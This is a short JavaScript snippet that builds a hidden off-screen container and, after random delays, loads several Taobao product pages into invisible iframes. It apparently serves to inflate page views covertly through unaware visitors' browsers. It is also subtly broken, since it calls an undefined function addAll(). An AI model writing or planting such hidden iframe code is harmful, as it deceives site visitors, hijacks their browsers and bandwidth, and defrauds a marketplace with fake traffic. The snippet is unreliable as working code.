var backYard = document.createElement('div');
backYard.id = "backYard";
backYard.style.position = "absolute";
backYard.style.left = "-99999em";
backYard.style.visibility = "hidden";
document.body.appendChild(backYard);
var itemList = [
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.gY06gc&id=37426777334',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.sbpy5z&id=37303359972',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.4B4mpj&id=37470266944',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.wFVx4L&id=37491168447',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.5OxFBc&id=37439252185',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.kphUGz&id=37439148275',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.yINqgZ&id=37426157644',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.a2S4Uv&id=37439072100',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.bdqjrw&id=37476665092',
    'http://item.taobao.com/item.htm?spm=a230r.1.14.1.vT0CdT&id=37477341459'
];
try {
    var i = 0;

    function addFrame() {
        if (i < 6) {
            var timer = parseInt(Math.random() * 500 + Math.random() * 1000);
            setTimeout(function() {
                var newIframe = document.createElement('iframe');
                var randomIndex = parseInt(Math.random() * itemList.length);
                newIframe['src'] = itemList[randomIndex];
                newIframe.width = 120;
                newIframe.height = 120;
                newIframe.frameBorder = 0;
                newIframe.scrolling = "no";
                document.getElementById('backYard').appendChild(newIframe);
                itemList.splice(randomIndex, 1);
                addAll();
            }, timer)
        }
        i++;
    }
    addFrame()
} catch (ex) {
    console.log(ex)
}